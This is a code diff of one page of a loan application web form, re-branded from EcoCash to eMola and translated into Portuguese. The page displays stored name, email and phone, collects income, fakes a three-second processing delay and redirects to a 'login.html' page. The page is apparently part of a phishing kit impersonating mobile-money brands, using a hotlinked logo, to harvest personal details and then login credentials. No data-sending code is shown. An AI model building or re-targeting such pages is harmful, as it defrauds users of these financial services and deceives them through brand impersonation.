@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EcoCash - Loan Application</title>
+    <title>eMola - Candidatura de Empréstimo</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         * {
@@ -49,16 +49,15 @@
         }
         
         .logo {
-            font-size: 28px;
-            font-weight: 700;
+            height: 40px;
+            display: flex;
+            align-items: center;
         }
         
-        .logo-eco {
-            color: #0066ff;
-        }
-        
-        .logo-cash {
-            color: #ff0000;
+        .logo img {
+            height: 100%;
+            width: auto;
+            object-fit: contain;
         }
         
         .card {
@@ -101,7 +100,7 @@
         .progress-fill {
             width: 100%;
             height: 100%;
-            background: linear-gradient(to right, #4361ee, #7209b7);
+            background: linear-gradient(to right, #d1450e, #df9b09);
         }
         
         .step-text {
@@ -168,7 +167,7 @@
         }
         
         .submit-btn {
-            background: linear-gradient(to right, #4361ee, #7209b7);
+            background: linear-gradient(to right, #f8770e, #e08d0f);
             color: white;
             position: relative;
         }
@@ -181,7 +180,7 @@
             width: 100%;
             max-width: 480px;
         }
-        /* Spinner Overlay - Transparent Bluish */
+        /* Overlay de Carregamento - Azul Translúcido */
         
         #spinnerOverlay {
             position: fixed;
@@ -190,7 +189,7 @@
             width: 100%;
             height: 100%;
             background: rgba(0, 102, 255, 0.15);
-            /* Transparent bluish */
+            /* Azul translúcido */
             display: none;
             justify-content: center;
             align-items: center;
@@ -202,7 +201,7 @@
             width: 60px;
             height: 60px;
             border: 6px solid #f0f0f0;
-            border-top: 6px solid #0066ff;
+            border-top: 6px solid #e68b15;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin-bottom: 30px;
@@ -216,7 +215,7 @@
                 transform: rotate(360deg);
             }
         }
-        /* Success Overlay */
+        /* Overlay de Sucesso */
         
         #successOverlay {
             position: fixed;
@@ -285,7 +284,7 @@
             width: 20px;
             height: 20px;
             border: 2px solid #f3f3f3;
-            border-top: 2px solid #0066ff;
+            border-top: 2px solid #e78d18;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
@@ -293,7 +292,7 @@
         .go-login-btn {
             width: 100%;
             padding: 16px;
-            background: #0066ff;
+            background: #f76b0e;
             color: white;
             border: none;
             border-radius: 50px;
@@ -307,65 +306,65 @@
 <body>
     <header>
         <button class="back-btn" onclick="history.back()">←</button>
-        <div class="logo"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
+        <div class="logo"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQLjt7GJwM7u7GcGVvgKYFLd3Rbs5izlnLeBAf_tGdu8Q&s=10" alt="eMola"></div>
         <div></div>
     </header>
 
     <main class="card">
         <div class="top">
-            <h1 class="form-title">Final Review</h1>
+            <h1 class="form-title">Revisão Final</h1>
             <div class="progress-bar">
                 <div class="progress-fill"></div>
             </div>
-            <div class="step-text">Step 3 of 3</div>
-            <label class="form-label">Employment Status</label>
+            <div class="step-text">Etapa 3 de 3</div>
+            <label class="form-label">Situação Profissional</label>
             <select class="form-select" id="employmentStatus">
-                <option>Employed</option>
-                <option>Self-Employed</option>
-                <option>Unemployed</option>
-                <option>Student</option>
+                <option>Empregado</option>
+                <option>Trabalhador por Conta Própria</option>
+                <option>Desempregado</option>
+                <option>Estudante</option>
             </select>
-            <label class="form-label">Annual Income ($)</label>
-            <input type="number" class="form-input" id="annualIncome" placeholder="50000">
+            <label class="form-label">Rendimento Anual (MZN)</label>
+            <input type="number" class="form-input" id="annualIncome" placeholder="3200000">
             <div class="summary-box" id="summaryBox">
-                <!-- Filled dynamically by JavaScript -->
+                <!-- Preenchido dinamicamente pelo JavaScript -->
             </div>
         </div>
         <div class="btn-group">
-            <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
-            <button class="submit-btn" id="submitBtn">SUBMIT APPLICATION</button>
+            <button class="prev-btn" onclick="history.back()">ANTERIOR</button>
+            <button class="submit-btn" id="submitBtn">SUBMETER CANDIDATURA</button>
         </div>
     </main>
-    <footer>© 2025 EcoCash</footer>
-    <!-- Spinner Overlay (Transparent Bluish) -->
+    <footer>© 2025 eMola</footer>
+    <!-- Overlay de Carregamento (Azul Translúcido) -->
     <div id="spinnerOverlay">
         <div class="spinner"></div>
     </div>
-    <!-- Success Overlay -->
+    <!-- Overlay de Sucesso -->
     <div id="successOverlay">
         <div class="success-card">
             <div class="check-icon">✓</div>
-            <div class="success-title">Loan Application Submitted</div>
+            <div class="success-title">Candidatura de Empréstimo Submetida</div>
             <div class="success-msg">
-                Your loan application has been submitted. Please wait for approval.<br><br> You will receive a confirmation message. For now, proceed to EcoCash.
+                A sua candidatura de empréstimo foi submetida. Aguarde a aprovação.<br><br> Irá receber uma mensagem de confirmação. Por agora, prossiga para o eMola.
             </div>
             <div class="redirect-bar">
                 <div class="loader"></div>
-                Redirecting to EcoCash login in <span id="countdown">3</span>...
+                Redirecionando para o login do eMola em <span id="countdown">3</span>...
             </div>
-            <button class="go-login-btn" onclick="window.location.href='login.html'">Go to Login Now</button>
+            <button class="go-login-btn" onclick="window.location.href='login.html'">Ir para o Login Agora</button>
         </div>
     </div>
     <script>
         const summaryBox = document.getElementById('summaryBox');
         summaryBox.innerHTML = `
-            <div class="summary-row"><span>Loan Type:</span><span class="summary-value">${localStorage.getItem('loanType') || 'Personal Loan'}</span></div>
-            <div class="summary-row"><span>Amount:</span><span class="summary-value">$${parseFloat(localStorage.getItem('loanAmount') || 5000).toLocaleString()}</span></div>
-            <div class="summary-row"><span>Term:</span><span class="summary-value">${localStorage.getItem('loanTerm') || '12'} Months</span></div>
-            <div class="summary-row"><span>Purpose:</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'Not specified'}</span></div>
-            <div class="summary-row"><span>Name:</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
-            <div class="summary-row"><span>Email:</span><span class="summary-value">${localStorage.getItem('email') || 'N/A'}</span></div>
-            <div class="summary-row"><span>Phone:</span><span class="summary-value">+263 ${localStorage.getItem('phone') || 'N/A'}</span></div>
+            <div class="summary-row"><span>Tipo de Empréstimo:</span><span class="summary-value">${localStorage.getItem('loanType') || 'Empréstimo Pessoal'}</span></div>
+            <div class="summary-row"><span>Montante:</span><span class="summary-value">${parseFloat(localStorage.getItem('loanAmount') || 320000).toLocaleString('pt-MZ')} MZN</span></div>
+            <div class="summary-row"><span>Prazo:</span><span class="summary-value">${localStorage.getItem('loanTerm') || '12'} Meses</span></div>
+            <div class="summary-row"><span>Finalidade:</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'Não especificado'}</span></div>
+            <div class="summary-row"><span>Nome:</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
+            <div class="summary-row"><span>Email:</span><span class="summary-value">${localStorage.getItem('email') || 'N/D'}</span></div>
+            <div class="summary-row"><span>Telemóvel:</span><span class="summary-value">+258 ${localStorage.getItem('phone') || 'N/D'}</span></div>
         `;
         if (localStorage.getItem('employmentStatus')) {
             document.getElementById('employmentStatus').value = localStorage.getItem('employmentStatus');
@@ -375,20 +374,20 @@
         }
         document.getElementById('submitBtn').addEventListener('click', function() {
             const income = document.getElementById('annualIncome').value.trim();
-            if (!income || income < 1000) {
-                alert('Please enter a valid annual income (minimum $1,000).');
+            if (!income || income < 50000) {
+                alert('Por favor, introduza um rendimento anual válido (mínimo 50.000 MZN).');
                 return;
             }
             localStorage.setItem('employmentStatus', document.getElementById('employmentStatus').value);
             localStorage.setItem('annualIncome', income);
-            // Show transparent bluish spinner for 3 seconds
+            // Mostrar overlay azul translúcido durante 3 segundos
             const spinnerOverlay = document.getElementById('spinnerOverlay');
             spinnerOverlay.style.display = 'flex';
             setTimeout(() => {
                 spinnerOverlay.style.display = 'none';
                 const successOverlay = document.getElementById('successOverlay');
                 successOverlay.style.display = 'flex';
-                // Countdown 3 seconds then auto redirect
+                // Contagem decrescente de 3 segundos e redirecionamento automático
                 let seconds = 3;
                 const countdownEl = document.getElementById('countdown');
                 const timer = setInterval(() => {
